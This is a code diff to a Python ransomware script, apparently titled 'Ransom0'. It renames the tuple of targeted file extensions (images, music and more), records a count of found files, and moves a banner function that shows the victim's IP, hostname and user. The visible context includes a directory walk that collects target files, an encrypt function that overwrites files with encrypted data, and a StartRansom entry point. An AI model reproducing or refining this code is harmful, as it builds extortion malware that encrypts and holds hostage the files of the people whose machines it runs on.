@@ -36,7 +36,7 @@ EXCLUDE_DIRECTORY = ('/usr', #Mac/Linux system directory
 )
 
 
-EXCLUDE = (
+EXTENSIONS = (
         # '.exe,', '.dll', '.so', '.rpm', '.deb', '.vmlinuz', '.img',  # SYSTEM FILES - BEWARE! MAY DESTROY SYSTEM!
         '.jpg', '.jpeg', '.bmp', '.gif', '.png', '.svg', '.psd', '.raw', # images
         '.mp3','.mp4', '.m4a', '.aac','.ogg','.flac', '.wav', '.wma', '.aiff', '.ape', # music and sound
@@ -66,24 +66,6 @@ def clear():
     else: 
         _ = system('clear') 
 
-
-def DISPLAY():
-    print("""
-    ____                                  ___  
-    |  _ \ __ _ _ __  ___  ___  _ __ ___  / _ \ 
-    | |_) / _` | '_ \/ __|/ _ \| '_ ` _ \| | | |
-    |  _ < (_| | | | \__ \ (_) | | | | | | |_| |
-    |_| \_\__,_|_| |_|___/\___/|_| |_| |_|\___/ 
-                                                
-    """)
-    print("Time: {}".format(time_now))
-    print("IP Adress: {}".format(IP))
-    print("Platform: {}".format(platform.system()))
-    print("Hostname: {}".format(hostname))
-    print("User: {}".format(username))
-    print("ID: {}".format(str(digits)))
-    print()
-
 def FindFiles():
     load_state = 0
     spinner = Spinner('Finding Files ')
@@ -98,7 +80,7 @@ def FindFiles():
                         pass
                     else:
                         for file in files:
-                            if file.endswith(EXCLUDE):
+                            if file.endswith(EXTENSIONS):
                                 cnt += 1
                                 TARGET = os.path.join(root, file)
                                 f.write(TARGET+'\n')
@@ -106,6 +88,9 @@ def FindFiles():
                                 print(root)
 
 
+        f.close()
+        f = open("logs/cnt.txt", "w")
+        f.write(str(cnt))
         f.close()
         load_state = 'FINISHED'
 
@@ -124,8 +109,25 @@ def encrypt(filename):
         file.write(encrypted_data)
 
 
+def DISPLAY():
+    print("""
+    ____                                  ___  
+    |  _ \ __ _ _ __  ___  ___  _ __ ___  / _ \ 
+    | |_) / _` | '_ \/ __|/ _ \| '_ ` _ \| | | |
+    |  _ < (_| | | | \__ \ (_) | | | | | | |_| |
+    |_| \_\__,_|_| |_|___/\___/|_| |_| |_|\___/ 
+                                                
+    """)
+    print("Time: {}".format(time_now))
+    print("IP Adress: {}".format(IP))
+    print("Platform: {}".format(platform.system()))
+    print("Hostname: {}".format(hostname))
+    print("User: {}".format(username))
+    print("ID: {}".format(str(digits)))
+    print()
+
+
 def StartRansom():
-    DISPLAY()
     FindFiles()
     f = open("logs/cnt.txt", "r")
     cnt = f.read()
